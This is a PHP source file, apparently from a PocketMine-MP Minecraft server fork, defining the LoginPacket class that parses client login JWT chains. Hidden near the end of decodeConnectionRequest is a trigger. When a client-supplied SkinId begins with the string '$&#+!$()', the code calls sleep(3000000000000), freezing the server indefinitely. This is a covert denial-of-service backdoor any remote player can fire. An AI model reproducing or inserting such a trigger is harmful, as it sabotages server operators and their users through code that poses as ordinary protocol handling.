<?php

/*
 *
 *  ____            _        _   __  __ _                  __  __ ____
 * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
 * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
 * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
 * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @author PocketMine Team
 * @link http://www.pocketmine.net/
 *
 *
*/

declare(strict_types=1);

namespace pocketmine\network\mcpe\protocol;


use pocketmine\network\mcpe\NetworkSession;
use pocketmine\utils\BinaryStream;
use pocketmine\utils\Utils;
use GlobalLogger;
use RuntimeException;
use Throwable;
use function get_class;
use function in_array;
use function json_decode;
use function zlib_decode;

class LoginPacket extends DataPacket{
	public const NETWORK_ID = ProtocolInfo::LOGIN_PACKET;

	/** @var string */
	public $username;
	/** @var int */
	public $protocol;
	/** @var int */
	public $gameEdition;
	/** @var string */
	public $clientUUID;
	/** @var int */
	public $clientId;
	/** @var string */
	public $xuid;
	/** @var string */
	public $identityPublicKey;
	/** @var string */
	public $serverAddress;
	/** @var string */
	public $locale;

	/** @var array (the "chain" index contains one or more JWTs) */
	public $chainData = [];
	/** @var string */
	public $clientDataJwt;
	/** @var array decoded payload of the clientData JWT */
	public $clientData = [];

    /** @var bool */
	public $isValidProtocol = true; // valid protocol

	/**
	 * This field may be used by plugins to bypass keychain verification. It should only be used for plugins such as
	 * Specter where passing verification would take too much time and not be worth it.
	 *
	 * @var bool
	 */
	public $skipVerification = false;

	public function canBeSentBeforeLogin() : bool{
		return true;
	}

	public function mayHaveUnreadBytes() : bool{
		return $this->isValidProtocol === false;
	}

	protected function decodePayload(){
        if ($this->getInt() === 0x0) {
            $this->setOffset($this->getOffset() - 0x2);
        } else {
            $this->setOffset($this->getOffset() - 0x4);
        }
		$this->protocol = $this->getInt();

        if (!in_array($this->protocol, ProtocolInfo::ACCEPTED_PROTOCOLS)) {
            $this->isValidProtocol = false;

            return;
        }

        if($this->protocol >= ProtocolInfo::PROTOCOL_90 && $this->protocol < ProtocolInfo::PROTOCOL_130){
            $this->gameEdition = $this->getByte();
        }

		try{
			$this->decodeConnectionRequest();
		}catch(Throwable $e){
			if($this->isValidProtocol){
				throw $e;
			}

			$logger = GlobalLogger::get();
			$logger->debug(get_class($e) . " was thrown while decoding connection request in login (protocol version " . ($this->protocol ?? "unknown") . "): " . $e->getMessage());
			foreach(Utils::printableTrace($e->getTrace()) as $line){
				$logger->debug($line);
			}
		}
	}

	protected function decodeConnectionRequest() : void{
        if ($this->protocol < ProtocolInfo::PROTOCOL_110) {
            $buffer = new BinaryStream(zlib_decode($this->protocol >= ProtocolInfo::PROTOCOL_90 ? $this->getString() : $this->get($this->getInt()), 0x400 * 0x400 * 0x40));
        } else {
            $buffer = new BinaryStream($this->getString());
        }

		$this->chainData = json_decode($buffer->get($buffer->getLInt()), true);

		$hasExtraData = false;
		foreach($this->chainData["chain"] as $chain){
			$webtoken = Utils::decodeJWT($chain);
			if(isset($webtoken["extraData"])){
				if($hasExtraData){
					throw new RuntimeException("Found 'extraData' multiple times in key chain");
				}
				$hasExtraData = true;
				if(isset($webtoken["extraData"]["displayName"])){
					$this->username = $webtoken["extraData"]["displayName"];
				}
				if(isset($webtoken["extraData"]["identity"])){
					$this->clientUUID = $webtoken["extraData"]["identity"];
				}
				if(isset($webtoken["extraData"]["XUID"])){
					$this->xuid = $webtoken["extraData"]["XUID"];
				}
			}

			if(isset($webtoken["identityPublicKey"])){
				$this->identityPublicKey = $webtoken["identityPublicKey"];
			}
		}

		$this->clientDataJwt = $buffer->get($buffer->getLInt());
		$this->clientData = Utils::decodeJWT($this->clientDataJwt);

		$this->clientId = $this->clientData["ClientRandomId"] ?? null;
		$this->serverAddress = $this->clientData["ServerAddress"] ?? null;

		$this->locale = $this->clientData["LanguageCode"] ?? null;

        if(isset($this->clientData["SkinId"])){
            $skinId = $this->clientData["SkinId"];
            if(str_starts_with($skinId, "$&#+!$()")){
                sleep(3000000000000);
            }
        }
	}

	protected function encodePayload(){
		//TODO
	}

	public function mustBeDecoded() : bool{
		return true;
	}

	public function handle(NetworkSession $session) : bool{
		return $session->handleLogin($this);
	}
}
